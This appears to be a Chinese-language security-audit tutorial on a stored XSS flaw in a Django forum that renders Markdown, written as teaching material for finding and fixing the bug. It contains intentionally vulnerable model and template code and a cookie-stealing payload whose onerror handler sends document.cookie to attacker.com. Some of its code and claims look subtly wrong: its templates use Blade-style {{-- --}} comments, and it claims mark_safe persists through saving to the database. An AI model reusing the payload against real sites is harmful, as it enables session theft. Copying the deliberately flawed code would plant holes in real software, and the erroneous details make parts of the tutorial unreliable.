# 案例研究：Django 论坛中的 XSS 漏洞

> **难度等级：** ★★★☆☆ (中级)
> **审计时间：** 50-70 分钟 (完整链路)
> **框架：** Django + REST Framework

## 漏洞场景

Django 论坛允许用户发表帖子和评论，支持 Markdown 格式。

## 完整漏洞代码

### Django Model

```python
# models.py
from django.db import models
from django.utils.html import mark_safe
import markdown

class Post(models.Model):
    title = models.CharField(max_length=255)
    content_raw = models.TextField()  # 原始 Markdown
    content_html = models.TextField()  # 转换后的 HTML
    author = models.ForeignKey(User, on_delete=models.CASCADE)
    created_at = models.DateTimeField(auto_now_add=True)

    def save(self, *args, **kwargs):
        # ❌ 问题 1：使用 Markdown 但未净化输出
        html = markdown.markdown(self.content_raw)
        # ❌ 问题 2：使用 mark_safe，标记为安全但未净化
        self.content_html = mark_safe(html)
        super().save(*args, **kwargs)

class Comment(models.Model):
    post = models.ForeignKey(Post, on_delete=models.CASCADE)
    text = models.TextField()
    author = models.ForeignKey(User, on_delete=models.CASCADE)
    created_at = models.DateTimeField(auto_now_add=True)
```

### Django View

```python
# views.py
from rest_framework import viewsets
from rest_framework.response import Response

class PostViewSet(viewsets.ModelViewSet):
    queryset = Post.objects.all()
    serializer_class = PostSerializer

    def create(self, request, *args, **kwargs):
        # ❌ 问题 3：直接接收用户输入，无验证
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        self.perform_create(serializer)
        return Response(serializer.data)

class CommentViewSet(viewsets.ModelViewSet):
    queryset = Comment.objects.all()
    serializer_class = CommentSerializer
    # ❌ 同样问题：直接保存用户输入
```

### Serializer

```python
# serializers.py
from rest_framework import serializers

class PostSerializer(serializers.ModelSerializer):
    class Meta:
        model = Post
        fields = ['id', 'title', 'content_raw', 'content_html', 'author']
        # ❌ 问题 4：序列化器没有验证或净化

    def create(self, validated_data):
        # 直接创建，Model.save() 会处理 HTML 转换
        return Post.objects.create(**validated_data)
```

### 前端模板

```html
<!-- templates/post_detail.html -->
<article>
    <h1>{{ post.title }}</h1>

    {{-- Django 模板中 mark_safe() 标记的内容不被转义 --}}
    <div class="content">
        {{ post.content_html }}
        {{-- 这直接输出原始 HTML，如果包含 <img onerror> 等会执行 --}}
    </div>

    <div class="comments">
        {% for comment in post.comments.all %}
            <div class="comment">
                {{-- ✅ 这里是安全的（自动转义） --}}
                <p>{{ comment.text }}</p>
            </div>
        {% endfor %}
    </div>
</article>
```

## 攻击向量

用户提交：
```markdown
Normal content

[Click me](javascript:alert(document.cookie))

<img src=x onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">
```

Markdown 转换后的 HTML：
```html
<p>Normal content</p>

<p><a href="javascript:alert(document.cookie)">Click me</a></p>

<p><img src=x onerror="fetch(...)"></p>
```

使用 `mark_safe()` 后，Django 不会转义，直接输出到 HTML。

## 修复方案

### 修复 1：正确使用 Markdown + 净化

```python
# models.py
from django.db import models
from bleach import clean
import markdown

class Post(models.Model):
    title = models.CharField(max_length=255)
    content_raw = models.TextField()
    author = models.ForeignKey(User, on_delete=models.CASCADE)
    created_at = models.DateTimeField(auto_now_add=True)

    def get_content_html(self):
        """返回安全的 HTML 内容（不保存到数据库）"""
        # 1. 使用 Markdown 转换
        html = markdown.markdown(
            self.content_raw,
            extensions=['extra', 'codehilite']
        )

        # 2. 使用 Bleach 净化（重要！）
        safe_html = clean(
            html,
            tags=['p', 'br', 'strong', 'em', 'u', 'a', 'img',
                  'ol', 'ul', 'li', 'blockquote', 'code', 'pre'],
            attributes={
                'a': ['href', 'title'],
                'img': ['src', 'alt'],
                'code': ['class'],
                'pre': ['class']
            },
            protocols=['http', 'https', 'mailto']  # ✅ 限制协议
        )

        return safe_html

    def save(self, *args, **kwargs):
        # ❌ 不再使用 mark_safe
        # 内容在 get_content_html() 中动态生成和净化
        super().save(*args, **kwargs)
```

### 修复 2：序列化器添加验证

```python
# serializers.py
from rest_framework import serializers
from bleach import clean
import markdown

class PostSerializer(serializers.ModelSerializer):
    class Meta:
        model = Post
        fields = ['id', 'title', 'content_raw', 'author']

    def validate_title(self, value):
        """验证标题"""
        if len(value) > 255 or len(value) < 3:
            raise serializers.ValidationError(
                "Title must be between 3 and 255 characters"
            )
        return value

    def validate_content_raw(self, value):
        """验证内容长度"""
        if len(value) > 50000:
            raise serializers.ValidationError(
                "Content is too long"
            )
        return value
```

### 修复 3：模板正确显示

```html
<!-- templates/post_detail.html -->
<article>
    <h1>{{ post.title }}</h1>

    {{-- ✅ 使用 get_content_html() 方法获取已净化的 HTML --}}
    <div class="content">
        {{ post.get_content_html|safe }}
        {{--
            注意：在这里使用 |safe 是安全的，
            因为内容已经被 Bleach 净化过了
        --}}
    </div>

    <div class="comments">
        {% for comment in post.comments.all %}
            <div class="comment">
                {{-- ✅ 评论文本自动转义，非常安全 --}}
                <p>{{ comment.text }}</p>
            </div>
        {% endfor %}
    </div>
</article>
```

### 修复 4：使用 Django SafeString 正确标记

```python
# models.py
from django.utils.safestring import mark_safe

class Post(models.Model):
    # ... 字段 ...

    def get_content_html(self):
        """获取已净化和标记的 HTML"""
        html = self._generate_safe_html()
        # ✅ 只有在确认已净化后才使用 mark_safe
        return mark_safe(html)

    def _generate_safe_html(self):
        """生成安全的 HTML"""
        html = markdown.markdown(self.content_raw)
        return clean(html, ...)  # 净化
```

## 审计检查清单

代码审计：
- [ ] 是否使用了 `mark_safe()` 但未进行净化？
- [ ] Markdown 库的输出是否被 Bleach 或类似库净化？
- [ ] Django 模板是否依赖于自动转义？
- [ ] 是否验证了用户输入长度？

设置审计（settings.py）：
- [ ] 是否启用了 `TEMPLATES` 中的 `autoescape`？
- [ ] 是否设置了 CSP headers？
- [ ] 是否启用了 CSRF 保护？

数据库审计：
- [ ] 现存数据是否已被净化？
- [ ] 是否有迁移脚本来清理历史数据？

## 修复优先级

### 立即（今天）
- [ ] 审计所有 `mark_safe()` 使用
- [ ] 查看是否对应内容进行了净化

### 短期（本周）
- [ ] 添加 Bleach 依赖
- [ ] 修改 Model 和序列化器
- [ ] 修改模板

### 中期（本月）
- [ ] 编写迁移脚本清理历史数据
- [ ] 添加单元测试
- [ ] 部署到生产环境

## 依赖和配置

```bash
# requirements.txt
Django>=3.2
djangorestframework
markdown
bleach>=5.0
```

```python
# Django settings.py
# 确保自动转义已启用（默认启用）
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                # ...
            ],
            'autoescape': True,  # ✅ 确保启用
        },
    },
]
```

